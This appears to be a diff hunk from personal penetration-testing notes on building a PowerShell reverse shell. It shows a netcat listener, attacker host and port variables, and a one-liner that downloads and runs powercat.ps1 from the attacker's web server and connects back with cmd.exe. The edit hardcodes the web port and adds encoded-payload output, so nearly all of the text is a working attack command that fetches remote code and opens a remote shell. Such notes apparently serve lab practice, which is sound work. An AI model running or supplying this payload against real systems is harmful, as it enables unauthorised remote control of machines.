@@ -28,8 +28,7 @@ nc -lvnp 8443
 PowerShell Reverse Shell and encode to Base64
 LHOST=192.168.45.191
 LPORT=8443
-WebPORT=88
-pwsh -c "iex (New-Object System.Net.WebClient).DownloadString('http://$LHOST:$WebPORT/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe" > revshell-pwsh.txt
+pwsh -c "iex (New-Object System.Net.WebClient).DownloadString('http://$LHOST:88/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > revshell-pwsh.txt
 
 Validate the content
 head revshell-pwsh.txt 
